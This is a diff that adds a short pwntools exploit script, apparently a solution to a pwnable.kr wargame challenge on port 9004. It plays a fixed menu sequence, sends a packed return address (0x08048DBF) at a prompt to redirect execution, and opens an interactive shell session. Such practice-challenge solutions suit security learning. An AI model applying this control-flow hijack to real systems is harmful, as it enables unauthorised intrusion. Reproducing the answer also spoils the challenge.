@@ -1,0 +1,43 @@
+from pwn import *
+
+r=remote("pwnable.kr",9004)
+
+print r.recvuntil("Knight")
+
+r.sendline("2")
+
+print r.recvuntil("20 HP.")
+
+r.sendline("2")
+
+r.sendline("1")
+
+r.sendline("3")
+
+r.sendline("3")
+
+r.sendline("2")
+
+r.sendline("3")
+
+r.sendline("3")
+
+r.sendline("2")
+
+r.sendline("3")
+
+r.sendline("3")
+
+r.sendline("2")
+
+r.sendline("3")
+
+r.sendline("3")
+
+r.sendline("2")
+
+print r.recvuntil("As:")
+
+r.sendline(p32(0x08048DBF))
+
+r.interactive()
